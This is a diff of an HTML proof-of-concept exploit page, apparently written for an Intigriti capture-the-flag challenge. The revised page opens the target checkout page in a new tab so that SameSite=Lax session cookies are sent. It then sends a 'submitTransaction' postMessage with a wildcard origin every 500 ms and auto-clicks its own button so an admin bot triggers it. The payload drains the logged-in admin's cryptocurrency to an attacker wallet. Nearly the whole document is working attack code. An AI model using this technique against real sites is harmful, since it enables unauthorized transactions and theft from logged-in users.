@@ -5,33 +5,39 @@
 </head>
 <body>
     <h1>"Following the trail of coins..."</h1>
-    
-    <iframe id="target" src="https://challenge-0126.intigriti.io/checkout.html?currency=BTC&price=1" width="500" height="500"></iframe>
+    <p>Opening target...</p>
+
+    <button id="exploitBtn" style="padding: 10px; background: #00FF88; color: black; border: none;">Run Exploit</button>
 
     <script>
-        // Step 2: Wait for the iframe to load
-        document.getElementById('target').onload = function() {
-            console.log("Iframe loaded, preparing payload...");
-            
-            var targetFrame = document.getElementById('target').contentWindow;
+        document.getElementById('exploitBtn').onclick = function() {
+            // Step 1: Open the vulnerable page in a new tab.
+            // This ensures SameSite=Lax cookies ARE sent, so the Admin is logged in.
+            var targetWindow = window.open("https://challenge-0126.intigriti.io/checkout.html?currency=BTC&price=1");
 
-            // Step 3: Craft the malicious transaction data
             var maliciousPayload = {
                 type: 'submitTransaction',
                 transaction: {
-                    currency: 'BTC', // You can change to ETH or XMR
-                    amount: 1337,    // A high amount to drain the admin
-                    toAddress: '11854a13cc79b72d8e6485a8f0801e607d' // Put your CTF user's wallet address here
+                    currency: 'BTC', 
+                    amount: 1337,
+                    toAddress: '11854a13cc79b72d8e6485a8f0801e607d' // Your wallet
                 }
             };
 
-            // Step 4: Send the message! The '*' means we send it to any origin.
-            // We use a slight delay to ensure target JS is fully initialized.
-            setTimeout(() => {
-                targetFrame.postMessage(maliciousPayload, '*');
+            // Step 2: Spam the postMessage every 500ms to ensure we hit it exactly when the JS loads.
+            var attempt = 0;
+            var interval = setInterval(() => {
+                targetWindow.postMessage(maliciousPayload, '*');
                 console.log("Payload sent!");
-            }, 1000); 
+                attempt++;
+                if (attempt > 10) clearInterval(interval); // Stop after 5 seconds
+            }, 500); 
         };
+
+        // Step 3: Auto-click the button for the Admin Bot
+        setTimeout(() => {
+            document.getElementById('exploitBtn').click();
+        }, 1000);
     </script>
 </body>
 </html>
